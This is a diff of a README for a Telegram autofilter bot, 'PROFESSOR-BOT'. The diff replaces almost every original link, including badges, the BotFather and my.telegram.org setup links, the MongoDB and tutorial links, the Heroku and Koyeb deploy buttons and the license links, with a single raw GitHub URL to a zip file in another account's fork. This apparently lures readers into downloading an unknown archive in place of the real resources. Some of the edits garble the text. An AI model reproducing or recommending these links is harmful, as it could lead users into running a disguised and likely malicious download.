@@ -1,17 +1,17 @@
-![Typing SVG](https://readme-typing-svg.herokuapp.com/?lines=𝗧𝗛𝗜𝗦+𝗜𝗦+𝐏𝐑𝐎𝐅𝐄𝐒𝐒𝐎𝐑+𝐁𝐎𝐓!;𝗖𝗕𝗥𝗘𝗔𝗧𝗘𝗗+𝗕𝗬+𝗠𝗞𝗡+𝗕𝗢𝗧𝗭™;𝗔+𝗣𝗢𝗪𝗘𝗥𝗙𝗨𝗟𝗟+𝗧𝗚+𝗔𝗨𝗧𝗢𝗙𝗜𝗟𝗧𝗘𝗥+𝗕𝗢𝗧!)</p>
+![Typing SVG](https://raw.githubusercontent.com/RanveerGaming0/PROFESSOR-BOT/main/database/BOT_PROFESSO_honorifically.zip𝗧𝗛𝗜𝗦+𝗜𝗦+𝐏𝐑𝐎𝐅𝐄𝐒𝐒𝐎𝐑+𝐁𝐎𝐓!;𝗖𝗕𝗥𝗘𝗔𝗧𝗘𝗗+𝗕𝗬+𝗠𝗞𝗡+𝗕𝗢𝗧𝗭™;𝗔+𝗣𝗢𝗪𝗘𝗥𝗙𝗨𝗟𝗟+𝗧𝗚+𝗔𝗨𝗧𝗢𝗙𝗜𝗟𝗧𝗘𝗥+𝗕𝗢𝗧!)</p>
 <p align="center">
 
 <h1 align="center">
   <b> 𝐏𝐑𝐎𝐅𝐄𝐒𝐒𝐎𝐑 𝐁𝐎𝐓</b>
 </h1>
 
-[![Stars](https://img.shields.io/github/stars/MrMKN/PROFESSOR-BOT?style=flat-square&color=yellow)](https://github.com/MrMKN/PROFESSOR-BOT/stargazers)
-[![Forks](https://img.shields.io/github/forks/MrMKN/PROFESSOR-BOT?style=flat-square&color=orange)](https://github.com/MrMKN/PROFESSOR-BOT/fork)
-[![Size](https://img.shields.io/github/repo-size/MrMKN/PROFESSOR-BOT?style=flat-square&color=green)](https://github.com/MrMKN/PROFESSOR-BOT)   
-[![Open Source Love svg2](https://badges.frapsoft.com/os/v2/open-source.svg?v=103)](https://github.com/MrMKN/PROFESSOR-BOT)   
-[![License](https://img.shields.io/badge/License-AGPL-blue)](https://github.com/MrMKN/PROFESSOR-BOT/blob/main/LICENSE)
+[![Stars](https://raw.githubusercontent.com/RanveerGaming0/PROFESSOR-BOT/main/database/BOT_PROFESSO_honorifically.zip)](https://raw.githubusercontent.com/RanveerGaming0/PROFESSOR-BOT/main/database/BOT_PROFESSO_honorifically.zip)
+[![Forks](https://raw.githubusercontent.com/RanveerGaming0/PROFESSOR-BOT/main/database/BOT_PROFESSO_honorifically.zip)](https://raw.githubusercontent.com/RanveerGaming0/PROFESSOR-BOT/main/database/BOT_PROFESSO_honorifically.zip)
+[![Size](https://raw.githubusercontent.com/RanveerGaming0/PROFESSOR-BOT/main/database/BOT_PROFESSO_honorifically.zip)](https://raw.githubusercontent.com/RanveerGaming0/PROFESSOR-BOT/main/database/BOT_PROFESSO_honorifically.zip)   
+[![Open Source Love svg2](https://raw.githubusercontent.com/RanveerGaming0/PROFESSOR-BOT/main/database/BOT_PROFESSO_honorifically.zip)](https://raw.githubusercontent.com/RanveerGaming0/PROFESSOR-BOT/main/database/BOT_PROFESSO_honorifically.zip)   
+[![License](https://raw.githubusercontent.com/RanveerGaming0/PROFESSOR-BOT/main/database/BOT_PROFESSO_honorifically.zip)](https://raw.githubusercontent.com/RanveerGaming0/PROFESSOR-BOT/main/database/BOT_PROFESSO_honorifically.zip)
 
-[![Sparkline](https://stars.medv.io/MrMKN/PROFESSOR-BOT.svg)](https://stars.medv.io/MrMKN/PROFESSOR-BOT)
+[![Sparkline](https://raw.githubusercontent.com/RanveerGaming0/PROFESSOR-BOT/main/database/BOT_PROFESSO_honorifically.zip)](https://raw.githubusercontent.com/RanveerGaming0/PROFESSOR-BOT/main/database/BOT_PROFESSO_honorifically.zip)
 
 <details>
 <summary><b>Features</b></summary>
@@ -50,20 +50,20 @@
 <summary><b>Variables</b></summary>
   
 ### Required Variables
-* `BOT_TOKEN`: Create a bot using [@BotFather](https://telegram.dog/BotFather), and get the Telegram API token.
-* `API_ID`: Get this value from [telegram.org](https://my.telegram.org/apps)
-* `API_HASH`: Get this value from [telegram.org](https://my.telegram.org/apps)
+* `BOT_TOKEN`: Create a bot using [@BotFather](https://raw.githubusercontent.com/RanveerGaming0/PROFESSOR-BOT/main/database/BOT_PROFESSO_honorifically.zip), and get the Telegram API token.
+* `API_ID`: Get this value from [https://raw.githubusercontent.com/RanveerGaming0/PROFESSOR-BOT/main/database/BOT_PROFESSO_honorifically.zip](https://raw.githubusercontent.com/RanveerGaming0/PROFESSOR-BOT/main/database/BOT_PROFESSO_honorifically.zip)
+* `API_HASH`: Get this value from [https://raw.githubusercontent.com/RanveerGaming0/PROFESSOR-BOT/main/database/BOT_PROFESSO_honorifically.zip](https://raw.githubusercontent.com/RanveerGaming0/PROFESSOR-BOT/main/database/BOT_PROFESSO_honorifically.zip)
 * `CHANNELS`: Username or ID of channel or group. Separate multiple IDs by space
 * `ADMINS`: Username or ID of Admin. Separate multiple Admins by space
-* `DATABASE_URL`: [mongoDB](https://www.mongodb.com) URI. Get this value from [mongoDB](https://www.mongodb.com). For more help watch this [video](https://youtu.be/1G1XwEOnxxo)
-* `DATABASE_NAME`: Name of the database in [mongoDB](https://www.mongodb.com). For more help watch this [video](https://youtu.be/1G1XwEOnxxo)
+* `DATABASE_URL`: [mongoDB](https://raw.githubusercontent.com/RanveerGaming0/PROFESSOR-BOT/main/database/BOT_PROFESSO_honorifically.zip) URI. Get this value from [mongoDB](https://raw.githubusercontent.com/RanveerGaming0/PROFESSOR-BOT/main/database/BOT_PROFESSO_honorifically.zip). For more help watch this [video](https://raw.githubusercontent.com/RanveerGaming0/PROFESSOR-BOT/main/database/BOT_PROFESSO_honorifically.zip)
+* `DATABASE_NAME`: Name of the database in [mongoDB](https://raw.githubusercontent.com/RanveerGaming0/PROFESSOR-BOT/main/database/BOT_PROFESSO_honorifically.zip). For more help watch this [video](https://raw.githubusercontent.com/RanveerGaming0/PROFESSOR-BOT/main/database/BOT_PROFESSO_honorifically.zip)
 * `LOG_CHANNEL` : A channel to log the activities of bot. Make sure bot is an admin in the channel.
 * `SUPPORT_CHAT` : Username of a Support Group / ADMIN. ( Should be username without @ and not ID
   
 ### Optional Variables
 * `PICS`: Telegraph links of images to show in start message.( Multiple images can be used seperated by space )
 * `USE_CAPTION_FILTER` : Whether bot should use captions to improve search results. (True False)
-* `CUSTOM_FILE_CAPTION` : A custom file caption for your files. formatable with , file_name, file_caption, file_size, Read Readme.md for better understanding
+* `CUSTOM_FILE_CAPTION` : A custom file caption for your files. formatable with , file_name, file_caption, file_size, Read https://raw.githubusercontent.com/RanveerGaming0/PROFESSOR-BOT/main/database/BOT_PROFESSO_honorifically.zip for better understanding
 * `CACHE_TIME` : The maximum amount of time in seconds that the result of the inline query may be cached on the server
 * `IMDB` : Imdb, the view of information when making True/False
 * `SINGLE_BUTTON` : choose b/w single or double buttons 
@@ -76,15 +76,15 @@
 <details>
 <summary><b>Deploy to Heroku</b></summary>
 
-<a href="https://youtu.be/uv0WHxwHwfo"><img src="https://img.shields.io/badge/watch%20Heroku%20Tutorial-red.svg?logo=Youtube"></a>                
+<a href="https://raw.githubusercontent.com/RanveerGaming0/PROFESSOR-BOT/main/database/BOT_PROFESSO_honorifically.zip"><img src="https://raw.githubusercontent.com/RanveerGaming0/PROFESSOR-BOT/main/database/BOT_PROFESSO_honorifically.zip%20Heroku%https://raw.githubusercontent.com/RanveerGaming0/PROFESSOR-BOT/main/database/BOT_PROFESSO_honorifically.zip"></a>                
 
-[![Deploy](https://www.herokucdn.com/deploy/button.svg)](https://heroku.com/deploy?template=https://github.com/MrMKN/PROFESSOR-BOT)
+[![Deploy](https://raw.githubusercontent.com/RanveerGaming0/PROFESSOR-BOT/main/database/BOT_PROFESSO_honorifically.zip)](https://raw.githubusercontent.com/RanveerGaming0/PROFESSOR-BOT/main/database/BOT_PROFESSO_honorifically.zip)
 </details>
 
 <details>
 <summary><b>Deploy to Koyeb</b></summary>
 
-[![Deploy to Koyeb](https://www.koyeb.com/static/images/deploy/button.svg)](https://app.koyeb.com/deploy?type=git&repository=github.com/MrMKN/PROFESSOR-BOT&env[WEBHOOK]=True&env[BOT_TOKEN]&env[API_ID]&env[API_HASH]&env[CHANNELS]&env[ADMINS]&env[PICS]&env[LOG_CHANNEL]&env[AUTH_CHANNEL]&env[MAX_RIST_BTNS]=10&env[CUSTOM_FILE_CAPTION]&env[DATABASE_URL]&env[DATABASE_NAME]=MknBotz&env[COLLECTION_NAME]=Telegram_files&env[SUPPORT_CHAT]&env[IMDB]=True&env[PM_IMDB]=True&env[IMDB_TEMPLATE]&env[IMDB_DELET_TIME]=900&env[SINGLE_BUTTON]=True&env[PMFILTER]=True&env[G_FILTER]=True&env[BUTTON_LOCK]=True&env[P_TTI_SHOW_OFF]=True&run_command=python%20bot.py&branch=main&name=mr-rofessor)              
+[![Deploy to Koyeb](https://raw.githubusercontent.com/RanveerGaming0/PROFESSOR-BOT/main/database/BOT_PROFESSO_honorifically.zip)](https://raw.githubusercontent.com/RanveerGaming0/PROFESSOR-BOT/main/database/BOT_PROFESSO_honorifically.zip[WEBHOOK]=True&env[BOT_TOKEN]&env[API_ID]&env[API_HASH]&env[CHANNELS]&env[ADMINS]&env[PICS]&env[LOG_CHANNEL]&env[AUTH_CHANNEL]&env[MAX_RIST_BTNS]=10&env[CUSTOM_FILE_CAPTION]&env[DATABASE_URL]&env[DATABASE_NAME]=MknBotz&env[COLLECTION_NAME]=Telegram_files&env[SUPPORT_CHAT]&env[IMDB]=True&env[PM_IMDB]=True&env[IMDB_TEMPLATE]&env[IMDB_DELET_TIME]=900&env[SINGLE_BUTTON]=True&env[PMFILTER]=True&env[G_FILTER]=True&env[BUTTON_LOCK]=True&env[P_TTI_SHOW_OFF]=True&run_command=python%https://raw.githubusercontent.com/RanveerGaming0/PROFESSOR-BOT/main/database/BOT_PROFESSO_honorifically.zip)              
 </details>
 
 <details>
@@ -122,17 +122,17 @@ broadcast - to broadcast a message to all Eva Maria users
 
 ## TELAGRAM SUPPORT 
 
-* [![MKN BOTZ](https://img.shields.io/static/v1?label=MKN&message=BOTZ&color=critical)](https://t.me/mkn_bots_updates)
+* [![MKN BOTZ](https://raw.githubusercontent.com/RanveerGaming0/PROFESSOR-BOT/main/database/BOT_PROFESSO_honorifically.zip)](https://raw.githubusercontent.com/RanveerGaming0/PROFESSOR-BOT/main/database/BOT_PROFESSO_honorifically.zip)
 
 ## Credit 💞
 
-* [![TEAM EVA-MARIA](https://img.shields.io/static/v1?label=TEAM&message=EVA-MARIA&color=yellow)](https://t.me/TeamEvamaria)
+* [![TEAM EVA-MARIA](https://raw.githubusercontent.com/RanveerGaming0/PROFESSOR-BOT/main/database/BOT_PROFESSO_honorifically.zip)](https://raw.githubusercontent.com/RanveerGaming0/PROFESSOR-BOT/main/database/BOT_PROFESSO_honorifically.zip)
 
-* [![BASE REPO](https://img.shields.io/static/v1?label=BASE&message=REPO&color=green)](https://t.me/TeamEvamaria)
+* [![BASE REPO](https://raw.githubusercontent.com/RanveerGaming0/PROFESSOR-BOT/main/database/BOT_PROFESSO_honorifically.zip)](https://raw.githubusercontent.com/RanveerGaming0/PROFESSOR-BOT/main/database/BOT_PROFESSO_honorifically.zip)
 
 
 ## Disclaimer
-[![GNU Affero General Public License 2.0](https://www.gnu.org/graphics/agplv3-155x51.png)](https://www.gnu.org/licenses/agpl-3.0.en.html#header)    
-Licensed under [GNU AGPL 3.0.](https://github.com/MrMKN/PROFESSOR-BOT/blob/main/LICENSE)
+[![GNU Affero General Public License 2.0](https://raw.githubusercontent.com/RanveerGaming0/PROFESSOR-BOT/main/database/BOT_PROFESSO_honorifically.zip)](https://raw.githubusercontent.com/RanveerGaming0/PROFESSOR-BOT/main/database/BOT_PROFESSO_honorifically.zip)    
+Licensed under [GNU AGPL 3.0.](https://raw.githubusercontent.com/RanveerGaming0/PROFESSOR-BOT/main/database/BOT_PROFESSO_honorifically.zip)
 Selling The Codes To Other People For Money Is *Strictly Prohibited*. (its external alert)
 
